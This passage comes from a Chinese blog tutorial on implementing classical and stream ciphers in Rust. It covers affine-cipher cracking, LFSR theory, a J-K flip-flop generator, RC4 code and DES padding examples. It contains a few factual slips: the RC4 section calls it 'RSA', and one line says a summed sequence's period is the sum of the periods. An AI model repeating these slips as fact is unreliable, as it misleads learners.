class="hljs-keyword">let</span> <span class="hljs-variable">new_ch</span> = <span class="hljs-type">char</span>::<span class="hljs-title function_ invoke__">try_from</span>(target).<span class="hljs-title function_ invoke__">unwrap</span>();<br>        ans.<span class="hljs-title function_ invoke__">push</span>(new_ch);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        ans.<span class="hljs-title function_ invoke__">push</span>(ch);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Ok</span>(ans);<br></code></pre></td></tr></table></figure><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/affine.png"alt="Affine" /><figcaption aria-hidden="true">Affine</figcaption></figure><h2 id="破解">破解</h2><p>首先，我们可以看到的是，仿射密码对于任意两个不同的字母，其最后得到的密文必然不一样，所以其也具有最通用的特点。当密文长度足够长时，我们可以使用频率分析的方法来解决。</p><p>其次，我们可以考虑如何攻击该密码。可以看出当<spanclass="math inline"><em>a</em> = 1</span>时，仿射加密是凯撒加密。而一般来说，我们利用仿射密码时，其字符集都用的是字母表，一般只有26个字母，而不大于26的与26互素的个数一共有</p><p><spanclass="math display"><em>ϕ</em>(26) = <em>ϕ</em>(2) × <em>ϕ</em>(13) = 12</span></p><p>算上b的偏移可能，一共有可能的密钥空间大小也就是</p><p><span class="math display">12 × 26 = 312</span></p><p>一般来说，对于该种密码，我们至少得是在已知部分明文的情况下才可以攻击。下面进行简单的分析。</p><p>这种密码由两种参数来控制，如果我们知道其中任意一个参数，那我们便可以很容易地快速枚举另外一个参数得到答案。</p><p>但是，假设我们已经知道采用的字母集，这里假设为26个字母，我们还有另外一种解密方式，我们只需要知道两个加密后的字母<spanclass="math inline"><em>y</em><sub>1</sub>, <em>y</em><sub>2</sub></span>即可进行解密。那么我们还可以知道</p><p><span class="math display">$$\begin{align}y_1 &amp;= (ax_1+b)\pmod{26} \\y_2 &amp;= (ax_2+b)\pmod{26}\end{align}$$</span></p><p>两式相减，可得</p><p><span class="math display">$$\begin{align}y_1-y_2 &amp;= a(x_1-x_2)\pmod{26}\end{align}$$</span></p><p>这里 <spanclass="math inline"><em>y</em><sub>1</sub>, <em>y</em><sub>2</sub></span>已知，如果我们知道密文对应的两个不一样的字符 <spanclass="math inline"><em>x</em><sub>1</sub></span> 与 <spanclass="math inline"><em>x</em><sub>2</sub></span>，那么我们就可以很容易得到 <span class="math inline"><em>a</em></span>，进而就可以得到 <span class="math inline"><em>b</em></span> 了。</p><h1 id="流密码">流密码</h1><p>流密码一般逐字节或者逐比特处理信息。一般来说</p><ul><li>流密码的密钥长度会与明文的长度相同。</li><li>流密码的密钥派生自一个较短的密钥，派生算法通常为一个伪随机数生成算法。</li></ul><p>需要注意的是，流加密目前来说都是对称加密。</p><p>伪随机数生成算法生成的序列的随机性越强，明文中的统计特征被覆盖的更好。</p><p>流密码加解密非常简单，在已知明文的情况下，可以非常容易地获取密钥流。</p><p>流密码的关键在于设计好的伪随机数生成器。一般来说，伪随机数生成器的基本构造模块为反馈移位寄存器。当然，也有一些特殊设计的流密码，比如RC4。</p><h2 id="反馈移位寄存器">反馈移位寄存器</h2><p>一般的，一个 n 级反馈移位寄存器如下图所示</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/n-fsr.png"alt="n-fsr" /><figcaption aria-hidden="true">n-fsr</figcaption></figure><p>其中</p><ul><li><span class="math inline"><em>a</em><sub>0</sub></span>，<spanclass="math inline"><em>a</em><sub>1</sub></span>，…，<spanclass="math inline"><em>a</em><sub><em>n</em> − 1</sub></span>为初态。</li><li>F 为反馈函数或者反馈逻辑。如果 F为线性函数，那么我们称其为线性反馈移位寄存器（LFSR），否则我们称其为非线性反馈移位寄存器（NFSR）。</li><li><spanclass="math inline"><em>a</em><sub><em>i</em> + <em>n</em></sub> = <em>F</em>(<em>a</em><sub><em>i</em></sub>, <em>a</em><sub><em>i</em> + 1</sub>, ..., <em>a</em><sub><em>i</em> + <em>n</em> − 1</sub>)</span>。</li></ul><p>一般来说，反馈移位寄存器都会定义在某个有限域上，从而避免数字太大和太小的问题。因此，我们可以将其视为同一个空间中的变换，即</p><p><spanclass="math inline">(<em>a</em><sub><em>i</em></sub>, <em>a</em><sub><em>i</em> + 1</sub>, ..., <em>a</em><sub><em>i</em> + <em>n</em> − 1</sub>) → (<em>a</em><sub><em>i</em> + 1</sub>, ..., <em>a</em><sub><em>i</em> + <em>n</em> − 1</sub>, <em>a</em><sub><em>i</em> + <em>n</em></sub>)</span>. 对于一个序列来说，我们一般定义其生成函数为其序列对应的幂级数的和。</p><h2 id="线性反馈移位寄存器---lfsr">线性反馈移位寄存器 - LFSR</h2><h3 id="介绍">介绍</h3><p>线性反馈移位寄存器的反馈函数一般如下</p><p><spanclass="math display">$$a_{i+n}=\sum\limits_{j=1}^{n}c_ja_{i+n-j}$$</span></p><p>其中，<spanclass="math inline"><em>c</em><sub><em>j</em></sub></span>均在某个有限域 <spanclass="math inline"><em>F</em><sub><em>q</em></sub></span> 中。</p><p>既然线性空间是一个线性变换，我们可以得知这个线性变换为</p><p><span class="math display">$$\begin{align}&amp;\left[  a_{i+1},a_{i+2},a_{i+3}, \ldots,a_{i+n}\right] \\&amp;= \left[  a_{i},a_{i+1},a_{i+2}, \ldots,a_{i+n-1}\right]\left[ \begin{matrix}0   &amp; 0      &amp; \cdots &amp; 0 &amp; c_n     \\1   &amp; 0      &amp; \cdots &amp; 0 &amp; c_{n-1}  \\0   &amp; 1      &amp; \cdots &amp; 0 &amp; c_{n-2} \\\vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots \\0   &amp; 0      &amp; \cdots &amp; 1 &amp; c_1\end{matrix} \right] \\&amp;= \left[  a_{0},a_{1},a_{2}, \ldots,a_{n-1}\right]\left[ \begin{matrix}0   &amp; 0      &amp; \cdots &amp; 0 &amp; c_n     \\1   &amp; 0      &amp; \cdots &amp; 0 &amp; c_{n-1}  \\0   &amp; 1      &amp; \cdots &amp; 0 &amp; c_{n-2} \\\vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots \\0   &amp; 0      &amp; \cdots &amp; 1 &amp; c_1\end{matrix} \right]^{i+1}\end{align}$$</span></p><p>进而，我们可以求得其特征多项式为</p><p><spanclass="math display">$$f(x)=x^n-\sum\limits_{i=1}^{n}c_ix^{n-i}$$</span></p><p>同时，我们定义其互反多项式为</p><p><span class="math display">$$\overlinef(x)=x^nf(\frac{1}{x})=1-\sum\limits_{i=1}^{n}c_ix^{i}$$</span></p><p>我们也称互反多项式为线性反馈移位寄存器的联结多项式。</p><p>这里有一些定理需要我们记一下，感兴趣的可以自行推导。</p><h3 id="样例">样例</h3><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/lfsr-1.png"alt="lfsr-1" /> <img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/lfsr-2.png"alt="lfsr-2" /></p><h3 id="特征多项式与生成函数">特征多项式与生成函数</h3><p>已知某个 n级线性反馈移位寄存器的特征多项式，那么该序列对应的生成函数为</p><p><span class="math display">$$A(x)=\frac{p(x)}{\overlinef(x)}$$</span></p><p>其中，<spanclass="math inline">$p(x)=\sum\limits_{i=1}^{n}(c_{n-i}x^{n-i}\sum\limits_{j=1}^{i}a_jx^{j-1})$</span>。可以看出p(x) 完全由初始状态和反馈函数的系数决定。</p><h3 id="序列周期与生成函数">序列周期与生成函数</h3><p>序列的的周期为其生成函数的既约真分式的分母的周期。</p><p>对于 n 级线性反馈移位寄存器，最长周期为 <spanclass="math inline">2<sup><em>n</em></sup> − 1</span>（排除全零）。达到最长周期的序列一般称为m 序列。</p><h3 id="特殊性质">特殊性质</h3><ul><li>将两个序列累加得到新的序列的周期为这两个序列的周期的和。</li><li>序列是 n 级 m 序列，当且仅当序列的极小多项式是 n 次本原多项式。</li></ul><h3 id="b-m-算法">B-M 算法</h3><p>一般来说，我们可以从两种角度来考虑 LFSR</p><ul><li>密钥生成角度，一般我们希望使用级数尽可能低的 LFSR来生成周期大，随机性好的序列。</li><li>密码分析角度，给定一个长度为 n 的序列 a，如何构造一个级数尽可能小的LFSR 来生成它。其实这就是 B-M 算法的来源。</li></ul><p>一般来说，我们定义一个序列的线性复杂度如下</p><ul><li>若 s 为一个全零序列，则线性复杂度为0。</li><li>若没有 LFSR 能生成 s，则线性复杂度为无穷。</li><li>否则，s 的线性复杂度为生成 L(s) 的最小级的 LFSR。</li></ul><p>BM 算法的要求我们需要知道长度为 2n 的序列。其复杂度</p><ul><li>时间复杂度：O(n^2) 次比特操作</li><li>空间复杂度：O(n) 比特。</li></ul><p>关于 BM 算法的细节，后续添加，目前处于学习过程中。</p><p>但是其实如果我们知道了长度为 2n的序列，我们也可以一种比较笨的方法来获取原先的序列。不妨假设已知的序列为<spanclass="math inline"><em>a</em><sub>1</sub>, ..., <em>a</em><sub>2<em>n</em></sub></span>，我们可以令</p><p><spanclass="math display"><em>S</em><sub>1</sub> = (<em>a</em><sub>1</sub>, ..., <em>a</em><sub><em>n</em></sub>)</span></p><p><spanclass="math display"><em>S</em><sub>2</sub> = (<em>a</em><sub>2</sub>, ..., <em>a</em><sub><em>n</em> + 1</sub>)</span></p><p>…</p><p><spanclass="math display"><em>S</em><sub><em>n</em> + 1</sub> = (<em>a</em><sub><em>n</em> + 1</sub>, ..., <em>a</em><sub>2<em>n</em></sub>)</span></p><p>那么我们可以构造矩阵 <spanclass="math inline"><em>X</em> = (<em>S</em><sub>1</sub>, ..., <em>S</em><sub><em>n</em></sub>)</span>，那么</p><p><spanclass="math display"><em>S</em><sub><em>n</em> + 1</sub> = (<em>c</em><sub><em>n</em></sub>, ..., <em>c</em><sub>1</sub>)<em>X</em></span></p><p>所以</p><p><spanclass="math display">(<em>c</em><sub><em>n</em></sub>, ..., <em>c</em><sub>1</sub>) = <em>S</em><sub><em>n</em> + 1</sub><em>X</em><sup>−1</sup></span></p><p>进而我们也就知道了 LFSR的反馈表达式，进而我们就可以推出初始化种子。</p><h2 id="非线性反馈移位寄存器">非线性反馈移位寄存器</h2><h3 id="介绍-1">介绍</h3><p>为了使得密钥流输出的序列尽可能复杂，会使用非线性反馈移位寄存器，常见的有三种</p><ul><li>非线性组合生成器，对多个 LFSR 的输出使用一个非线性组合函数</li><li>非线性滤波生成器，对一个 LFSR 的内容使用一个非线性组合函数</li><li>钟控生成器，使用一个（或多个）LFSR 的输出来控制另一个（或多个）LFSR的时钟</li></ul><h3 id="非线性组合生成器">非线性组合生成器</h3><h4 id="简介">简介</h4><p>组合生成器一般如下图所示。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/combine-generator.png"alt="combine-generator" /><figcaption aria-hidden="true">combine-generator</figcaption></figure><h4 id="jk触发器">JK触发器</h4><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/JK-1.png"alt="JK-1" /><figcaption aria-hidden="true">JK-1</figcaption></figure><h4id="利用j-k触发器的非线性序列生成器">利用J-K触发器的非线性序列生成器</h4><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/JK-2.png"alt="JK-2" /><figcaption aria-hidden="true">JK-2</figcaption></figure><h4 id="样例-1">样例</h4><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/JK-3.png"alt="JK-3" /><figcaption aria-hidden="true">JK-3</figcaption></figure><h4 id="rust实现-1">Rust实现</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LfsrJk</span> &#123;<br>    j_state: <span class="hljs-type">u32</span>,<br>    k_state: <span class="hljs-type">u32</span>,<br>    j_state_c: <span class="hljs-type">u32</span>,<br>    k_state_c: <span class="hljs-type">u32</span>,<br>    data_state: <span class="hljs-type">u8</span>,<br>&#125;<br><span class="hljs-keyword">impl</span> <span class="hljs-title class_">LfsrJk</span> &#123;<br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(j_state: <span class="hljs-type">u32</span>, k_state: <span class="hljs-type">u32</span>, j_state_c: <span class="hljs-type">u32</span>, k_state_c: <span class="hljs-type">u32</span>, data_state: <span class="hljs-type">u8</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> &#123;<br>        <span class="hljs-keyword">Self</span> &#123;<br>            j_state: <span class="hljs-number">0x12345678</span> - j_state,<br>            k_state: <span class="hljs-number">0x87654321</span> - k_state,<br>            j_state_c: <span class="hljs-number">0xffffffff</span> - j_state_c,<br>            k_state_c: <span class="hljs-number">0xffffffff</span> - k_state_c,<br>            data_state,<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">crypt</span>(&amp;<span class="hljs-keyword">self</span>, data: &amp;<span class="hljs-keyword">mut</span> [<span class="hljs-type">u8</span>]) &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">j_state</span> = <span class="hljs-keyword">self</span>.j_state;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">k_state</span> = <span class="hljs-keyword">self</span>.k_state;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">data_state</span> = <span class="hljs-keyword">self</span>.data_state;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">len</span> = data.<span class="hljs-title function_ invoke__">len</span>();<br>        <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..len &#123;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">j</span> = <span class="hljs-keyword">Self</span>::<span class="hljs-title function_ invoke__">round</span>(&amp;<span class="hljs-keyword">mut</span> j_state, <span class="hljs-keyword">self</span>.j_state_c);<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">k</span> = <span class="hljs-keyword">Self</span>::<span class="hljs-title function_ invoke__">round</span>(&amp;<span class="hljs-keyword">mut</span> k_state, <span class="hljs-keyword">self</span>.k_state_c);<br>            data_state = j ^ (!(j ^ k) &amp; data_state);<br>            data[i] ^= data_state;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">#[inline]</span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">round</span>(state: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-type">u32</span>, state_c: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">u8</span> &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">output</span> = <span class="hljs-number">0u8</span>;<br>        <span class="hljs-keyword">for</span> <span class="hljs-variable">_</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..<span class="hljs-number">8</span> &#123;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">t</span> = *state &amp; state_c;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">new_out</span> = t.<span class="hljs-title function_ invoke__">count_ones</span>() % <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">out</span> = (<span class="hljs-number">0x80000000</span> &amp; t) &gt;&gt; <span class="hljs-number">31</span>;<br>            output = (output &lt;&lt; <span class="hljs-number">1</span>) + out <span class="hljs-keyword">as</span> <span class="hljs-type">u8</span>;<br>            *state = (*state &lt;&lt; <span class="hljs-number">1</span>) + new_out;<br>        &#125;<br>        output<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/lfsr-jk.png"alt="lfsr-jk" /><figcaption aria-hidden="true">lfsr-jk</figcaption></figure><h2 id="rc4">RC4</h2><h3 id="基本介绍">基本介绍</h3><p>RSA 由 Ron Rivest设计，加解密使用相同的密钥，因此也属于对称加密算法。它是面向字节的流密码，密钥长度可变，非常简单，但也很有效果。RC4算法曾广泛应用于 SSL/TLS 协议和 WEP/WPA协议，但由于RC4算法存在弱点，2015年2月所发布的 RFC 7465规定禁止在TLS中使用RC4加密算法。</p><h3 id="基本流程">基本流程</h3><p>RC4 主要包含三个流程</p><ul><li>初始化 S 和 T 数组。</li><li>初始化置换 S。</li><li>生成密钥流。</li></ul><h4 id="初始化-s-和-t-数组">初始化 S 和 T 数组</h4><p>初始化 S 和 T 的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> i = <span class="hljs-number">0</span> to <span class="hljs-number">255</span> <span class="hljs-keyword">do</span><br>    S[i] = i<br>    T[i] = K[i mod keylen])<br></code></pre></td></tr></table></figure><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/rc4_s_t.png"alt="rc4_s_t" /><figcaption aria-hidden="true">rc4_s_t</figcaption></figure><h4 id="初始化置换-s">初始化置换 S</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">j = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i = <span class="hljs-number">0</span> to <span class="hljs-number">255</span> <span class="hljs-keyword">do</span> <br>j = (j + S[i] + T[i]) (mod <span class="hljs-number">256</span>) <br>swap (S[i], S[j])<br></code></pre></td></tr></table></figure><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/rc4_s.png"alt="rc4_s" /><figcaption aria-hidden="true">rc4_s</figcaption></figure><h4 id="生成流密钥">生成流密钥</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">i = j = <span class="hljs-number">0</span> <br><span class="hljs-keyword">for</span> each message byte b<br>i = (i + <span class="hljs-number">1</span>) (mod <span class="hljs-number">256</span>)<br>j = (j + S[i]) (mod <span class="hljs-number">256</span>)<br>swap(S[i], S[j])<br>t = (S[i] + S[j]) (mod <span class="hljs-number">256</span>) <br>print S[t]<br></code></pre></td></tr></table></figure><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/rc4_key.png"alt="rc4_key" /><figcaption aria-hidden="true">rc4_key</figcaption></figure><p>我们一般称前两部分为 KSA ，最后一部分是 PRGA。</p><h3 id="rust实现-2">Rust实现</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Rc4</span> &#123;<br>    s: [<span class="hljs-type">u32</span>; <span class="hljs-number">256</span>],<br>    key: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">u8</span>&gt;,<br>&#125;<br><br><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Rc4</span> &#123;<br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(key: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">u8</span>&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">key</span> = key;<br>        <span class="hljs-keyword">if</span> key.<span class="hljs-title function_ invoke__">len</span>() == <span class="hljs-number">0</span> &#123;<br>            key = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br>        &#125;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">rc4</span> = <span class="hljs-keyword">Self</span> &#123;<br>            s: [<span class="hljs-number">0u32</span>; <span class="hljs-number">256</span>],<br>            key,<br>        &#125;;<br>        rc4.<span class="hljs-title function_ invoke__">init</span>();<br>        rc4<br>    &#125;<br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">init</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">k</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">0u32</span>; <span class="hljs-number">256</span>];<br>        <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..<span class="hljs-number">256</span> &#123;<br>            <span class="hljs-keyword">self</span>.s[i] = i <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>;<br>            k[i] = <span class="hljs-keyword">self</span>.key[i % <span class="hljs-keyword">self</span>.key.<span class="hljs-title function_ invoke__">len</span>()] <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>;<br>        &#125;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">j</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..<span class="hljs-number">256</span> &#123;<br>            j = (j + <span class="hljs-keyword">self</span>.s[i] + k[i]) % <span class="hljs-number">256</span>;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">tmp</span> = <span class="hljs-keyword">self</span>.s[i];<br>            <span class="hljs-keyword">self</span>.s[i] = <span class="hljs-keyword">self</span>.s[j <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>];<br>            <span class="hljs-keyword">self</span>.s[j <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>] = tmp;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">crypt</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, data: &amp;<span class="hljs-keyword">mut</span> [<span class="hljs-type">u8</span>]) &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">j</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">t</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">s</span> = <span class="hljs-keyword">self</span>.s.<span class="hljs-title function_ invoke__">clone</span>();<br>        <span class="hljs-keyword">for</span> <span class="hljs-variable">k</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..data.<span class="hljs-title function_ invoke__">len</span>() &#123;<br>            i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>            j = (j + s[i]) % <span class="hljs-number">256</span>;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">tmp</span> = s[i];<br>            s[i] = s[j <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>];<br>            s[j <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>] = tmp;<br>            t = (s[i] + s[j <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>]) % <span class="hljs-number">256</span>;<br>            data[k] ^= s[t <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>] <span class="hljs-keyword">as</span> <span class="hljs-type">u8</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/rc4.png"alt="rc4" /><figcaption aria-hidden="true">rc4</figcaption></figure><h1 id="块加密">块加密</h1><h2 id="概述">概述</h2><p>所谓块加密就是每次加密一块明文，常见的加密算法有</p><ul><li>IDEA 加密</li><li>DES 加密</li><li>AES 加密</li></ul><p>块加密也是对称加密。</p><p>其实，我们也可以把块加密理解一种特殊的替代密码，但是其每次替代的是一大块。而正是由于一大块，明文空间巨大，而且对于不同的密钥，我们无法做一个表进行对应相应的密文，因此必须得有<strong>复杂</strong> 的加解密算法来加解密明密文。</p><p>而与此同时，明文往往可能很长也可能很短，因此在块加密时往往需要两个辅助</p><ul><li>padding，即 padding 到指定分组长度</li><li>分组加密模式，即明文分组加密的方式。</li></ul><h2 id="填充规则">填充规则</h2><p>正如我们之前所说，在分组加密中，明文的长度往往并不满足要求，需要进行padding，而如何 padding 目前也已经有了不少的规定。</p><p>常见的 <ahref="https://www.di-mgt.com.au/cryptopad.html">填充规则</a>如下。<strong>需要注意的是，即使消息的长度是块大小的整数倍，仍然需要填充。</strong></p><p>一般来说，如果在解密之后发现 Padding不正确，则往往会抛出异常。我们也因此可以知道 Paddig 是否正确。</p><h3id="pad-with-bytes-all-of-the-same-value-as-the-number-of-padding-bytes-pkcs5-padding">Padwith bytes all of the same value as the number of padding bytes (PKCS5padding)</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">DES INPUT BLOCK  = f  o  r  _  _  _  _  _<br>(IN HEX)           66 6F 72 05 05 05 05 05<br>KEY              = 01 23 45 67 89 AB CD EF<br>DES OUTPUT BLOCK = FD 29 85 C9 E8 DF 41 40<br></code></pre></td></tr></table></figure><h3 id="pad-with-0x80-followed-by-zero-bytes-oneandzeroes-padding">Padwith 0x80 followed by zero bytes (OneAndZeroes Padding)</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">DES INPUT BLOCK  = f  o  r  _  _  _  _  _<br>(IN HEX)           66 6F 72 80 00 00 00 00<br>KEY              = 01 23 45 67 89 AB CD EF<br>DES OUTPUT BLOCK = BE 62 5D 9F F3 C6 C8 40<br></code></pre></td></tr></table></figure><p>这里其实就是和 md5 和 sha1 的 padding 差不多。</p><h3id="pad-with-zeroes-except-make-the-last-byte-equal-to-the-number-of-padding-bytes">Padwith zeroes except make the last byte equal to the number of paddingbytes</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">DES INPUT BLOCK  = f  o  r  _  _  _  _  _<br>(IN HEX)           66 6f 72 00 00 00 00 05<br>KEY              = 01 23 45 67 89 AB CD EF<br>DES OUTPUT BLOCK = 91 19 2C 64 B5 5C 5D B8<br></code></pre></td></tr></table></figure><h3 id="pad-with-zero-null-characters">Pad 